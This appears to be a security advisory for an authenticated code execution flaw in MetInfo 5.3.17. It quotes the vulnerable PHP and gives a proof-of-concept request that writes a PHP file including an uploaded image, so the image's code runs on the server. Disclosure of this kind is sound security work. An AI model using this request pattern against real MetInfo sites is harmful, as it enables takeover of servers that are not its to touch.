# MetInfo 5.3.17 Authenticated Code Execution Vulnerability

## Technical Description:

 We can use the GPC data to register variables in `admin/include/common.inc.php`:

```php
foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
	foreach($$_request as $_key => $_value) {
		$_key{0} != '_' && $$_key = daddslashes($_value,0,0,1);
		$_M['form'][$_key]=daddslashes($_value,0,0,1);
	}
}
```

Then we can use the variable we have registered in `admin/app/physical/physical.php`:

```php
<?php 
require_once $depth.'../login/login_check.php';
...
if($action=="do"){
	...
}elseif($action=="fingerprint"){
	...
}elseif...
	...
}
?>
```

We can register the `$action` variable to control the flow of the program.

When the value of `$action` is `op` and the value of `$op` is 3 :

```php
case 3:
	$fileaddr=explode('/',$val[1]);
	$filedir="../../../".$fileaddr[0];  
	if(!file_exists($filedir)){ @mkdir ($filedir, 0777); } 
	if($fileaddr[1]=="index.php"){
		Copyindx("../../../".$val[1],$val[2]);
	}
	else{
		switch($val[2]){
			case 1:
				$address="../about/$fileaddr[1]";
			break;
			case 2:
				$address="../news/$fileaddr[1]";
			break;
			case 3:
				$address="../product/$fileaddr[1]";
			break;
			case 4:
				$address="../download/$fileaddr[1]";
			break;
			case 5:
				$address="../img/$fileaddr[1]";
			break;
			case 8:
				$address="../feedback/$fileaddr[1]";
			break;
			}   
			
			$newfile  ="../../../$val[1]";  			
			Copyfile($address,$newfile);
	}
		echo $lang_physicalgenok;
		break;
```

As we see, as long as the `$val[2]` is empty，we can register both `$address` and `$newfile`，then we go in to the `Copyfile`:

```php
function Copyfile($address,$newfile){
	$oldcont  = "<?php\n# ...require_once '$address';...\n?>";
	if(!file_exists($newfile)){
		$fp = fopen($newfile,w);
		fputs($fp, $oldcont);
		fclose($fp);
	}
}
```   

The program will write a file to the value of `$newfile`, the content of the file is a php script, which will `require_once` the value of `$address`. So we can construct a request to let the program require the malicious image file we have uploaded.

## Proof of Concept(PoC)

Frist we log in as administrator and upload an image, which content is `<php phpinfo();>`, then we can get the address of the image by viewing page source.

![Alt text](./getaddr.png)

Then we visit `http://host/admin/app/physical/physical.php?action=op&op=3&valphy=test|vuln/1.php&address=the_address_of_the_image` to generate the php script, in our example, the PoC url is  `http://127.0.0.1:8081/admin/app/physical/physical.php?action=op&op=3&valphy=test|vuln/1.php&address=../upload/file/1500012989.png` Finally, we can visit `http:/host/vuln/1.php` to execute the code.

![Alt text](./vuln.png)


